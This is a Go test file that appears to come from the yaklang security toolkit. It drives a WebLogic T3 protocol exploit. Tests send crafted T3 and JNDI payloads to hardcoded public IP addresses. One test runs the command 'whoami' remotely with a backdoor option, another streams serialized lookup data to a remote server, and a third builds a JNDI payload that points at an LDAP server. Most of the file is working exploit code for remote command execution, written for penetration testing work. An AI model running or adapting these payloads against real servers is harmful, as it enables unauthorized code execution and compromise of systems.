package t3

import (
	"fmt"
	utils2 "github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"io/ioutil"
	"net"
	"testing"
	"time"
)

func TestGenPyaload(t *testing.T) {
	send("123.58.236.76:32709")
}

func TestParseT3(t *testing.T) {
	data := "737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771f016e4ae3a517c12dae000c3139322e3136382e332e3232c148f3810000000078"
	content, err := codec.DecodeHex(data)
	if err != nil {
		println("open file error")
	}
	ParseT3(content)
}

func TestT3Payload(t *testing.T) {
	res, err := _execT3("123.58.236.76:32324", "whoami", SetClearBackdoor(true), SetTimeout(10), SetDebugHandler(func(s string) {
		//println(s)
	}))
	if err != nil {
		fmt.Printf("t3 exploit failed,error: %s \n", err)
		return
	}

	println(res)
}

func TestConnect(t *testing.T) {
	paylaod := T3Paylaod{}
	payload := paylaod.genLookup("z3")
	remoteAddr := "47.104.229.232:7001"
	localAddr := "192.168.101.147:7001"
	sendPaylaod(localAddr, payload)
	sendPaylaod(localAddr, payload)
	connect(remoteAddr)
}

func sendPaylaod(addr string, payload []byte) {

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		println(err.Error())
		return
	}

	header := "t3 10.3.1\nAS:255\nHL:19\n\n"
	conn.Write([]byte(header))
	byt, err := utils2.ReadConnWithTimeout(conn, 1*time.Second)
	if err != nil {
		println("read connect timeout")
	}
	println(string(byt))
	conn.Write(payload)
	byt2, err := utils2.ReadConnWithTimeout(conn, 1*time.Second)
	if err != nil {
		println("read connect timeout")
	}
	println(codec.EncodeToHex(byt2))
}

func connect(addr string) {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		println(err.Error())
		return
	}
	content, err := ioutil.ReadFile("/Users/z3/Downloads/context.data")
	if err != nil {
		println("open file error")
		return
	}
	header := "t3 10.3.1\nAS:255\nHL:19\n\n"
	conn.Write([]byte(header))
	byt, err := utils2.ReadConnWithTimeout(conn, 1*time.Second)
	if err != nil {
		println(err.Error())
	}
	println(string(byt))
	conn.Write(content)
	byt2, err := utils2.ReadConnWithTimeout(conn, 5*time.Second)
	if err != nil {
		println(err.Error())
	}
	println(codec.EncodeToHex(byt2))
	content, err = ioutil.ReadFile("/Users/z3/Downloads/lookup.data")
	conn.Write(content)
	byt3, err := utils2.ReadConnWithTimeout(conn, 5*time.Second)
	if err != nil {
		println(err.Error())
	}
	println(codec.EncodeToHex(byt3))
}

func TestGenPayload(t *testing.T) {
	paylaod := T3Paylaod{}
	paylaod.genContext()
}

func TestGenWeblogicJNDIPayload(t *testing.T) {
	byte := GenerateWeblogicJNDIPayload("ldap://192.168.202.1:1389/ayicvn")
	//println(string(byte))
	println(codec.EncodeToHex(byte))
}
